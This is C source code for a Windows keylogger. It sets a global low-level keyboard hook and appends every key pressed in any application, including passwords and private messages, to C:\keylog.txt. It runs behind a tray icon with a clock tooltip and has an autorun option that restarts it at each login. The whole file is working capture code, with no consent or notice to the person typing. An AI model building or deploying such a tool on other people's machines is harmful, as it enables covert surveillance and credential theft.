#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include "main.h"
#include "resource.h"
#include "key_names.h"
#include "timestamp.h"
#include "autorun.h"

#define WM_TRAY (WM_USER + 1000)
#define ID_AUTORUN 2000
#define ID_EXIT    2001
#define TIMER_ELAPSE_MS 1000
#define TIMER_ID 5000

NOTIFYICONDATA pnid;
HMENU hMenu;

void showPopupMenu(HWND hWnd)
{
    POINT cursor;
    GetCursorPos(&cursor);

    SetForegroundWindow(hWnd);
    TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, cursor.x, cursor.y,
        0, hWnd, NULL);
    PostMessage(hWnd, WM_NULL, 0, 0);
}

void reinit_menu(int create)
{
    if (create) {
        hMenu = CreatePopupMenu();
        InsertMenu(hMenu, 0, MF_BYPOSITION | MF_STRING, ID_AUTORUN,
            autorun_get(NULL) ? "Autorun [enabled]" : "Autorun [disabled]");
        InsertMenu(hMenu, 1, MF_BYPOSITION | MF_STRING, ID_EXIT, "Exit");
    } else {
        ModifyMenu(hMenu, 0, MF_BYPOSITION | MF_STRING, ID_AUTORUN,
            autorun_get(NULL) ? "Autorun [enabled]" : "Autorun [disabled]");
    }
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg,
    WPARAM wPrm, LPARAM lPrm)
{
    switch (uMsg) {
    case WM_TIMER:
        if (wPrm == TIMER_ID) {
            update_time_buf(pnid.szTip, ARRAYSIZE(pnid.szTip));
            Shell_NotifyIcon(NIM_MODIFY, &pnid);
            return 0;
        }
        break;
    case WM_TRAY:
        if (lPrm == WM_RBUTTONUP) {
            showPopupMenu(hWnd);
            return 0;
        }
        break;
    case WM_COMMAND:
        if (LOWORD(wPrm) == ID_AUTORUN) {
            autorun_set(!autorun_get(NULL));
            reinit_menu(0);
            return 0;
        } else if (LOWORD(wPrm) == ID_EXIT) {
            PostQuitMessage(0);
            return 0;
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hWnd, uMsg, wPrm, lPrm);
}

LRESULT CALLBACK KbdProc(int code, WPARAM wPrm, LPARAM lPrm)
{
    char buf[256];
    int vk_code;

    if (code < 0)
        return CallNextHookEx(NULL, code, wPrm, lPrm);

    vk_code = ((KBDLLHOOKSTRUCT *) lPrm)->vkCode;
    setKeyName(buf, vk_code);

    switch (wPrm) {
        case WM_KEYDOWN:
            printf("Key down: %s, code 0x%0X\n", buf, vk_code);
            break;
        case WM_KEYUP:
            printf("Key up: %s, code 0x%0X\n", buf, vk_code);
            break;
        case WM_SYSKEYDOWN:
            printf("Sys key down: %s, code 0x%0X\n", buf, vk_code);
            break;
        case WM_SYSKEYUP:
            printf("Sys key up: %s, code 0x%0X\n", buf, vk_code);
            break;
    }

    fflush(stdout);

    return CallNextHookEx(NULL, code, wPrm, lPrm);
}

int CALLBACK WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmdl, int show)
{
    MSG pmsg = {0};

    if (!freopen("C:\\keylog.txt", "a", stdout))
        exit(EXIT_FAILURE);

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdProc,
        GetModuleHandle(NULL), 0);

    // Make tray icon (initialize and copy for using
    // short structure initialize syntax).
    NOTIFYICONDATA pnid_local = {sizeof(pnid), NULL, 1,
        NIF_MESSAGE | NIF_ICON | NIF_TIP, WM_TRAY,
        LoadIcon(inst, MAKEINTRESOURCE(AppIcon)), ""};
    memcpy(&pnid, &pnid_local, sizeof(pnid));
    update_time_buf(pnid.szTip, ARRAYSIZE(pnid.szTip));

    // Make null window.
    WNDCLASSEX wndc = {sizeof(wndc), CS_HREDRAW | CS_VREDRAW, WindowProc,
        0, 0, inst, NULL, NULL, NULL, NULL, "-", NULL};
    if (!RegisterClassEx(&wndc))
        exit(EXIT_FAILURE);
    pnid.hWnd = CreateWindowEx(WS_EX_APPWINDOW, wndc.lpszClassName,
        NULL, WS_POPUP, 0, 0, 0, 0, NULL, NULL,
        wndc.hInstance, NULL);

    // Initialize autorun module.
    if (!autorun_init())
        return EXIT_FAILURE;
    autorun_fix();

    // Make right-click context menu for tray icon.
    reinit_menu(1);

    // Show icon.
    Shell_NotifyIcon(NIM_ADD, &pnid);

    SetTimer(pnid.hWnd, TIMER_ID, TIMER_ELAPSE_MS, NULL);

    while (GetMessage(&pmsg, NULL, 0, 0) > 0) {
        TranslateMessage(&pmsg);
        DispatchMessage(&pmsg);
    }

    KillTimer(pnid.hWnd, TIMER_ID);
    Shell_NotifyIcon(NIM_DELETE, &pnid);
    UnregisterClass(wndc.lpszClassName, inst);
    UnhookWindowsHookEx(hook);

    fclose(stdout);

    return pmsg.wParam;
}
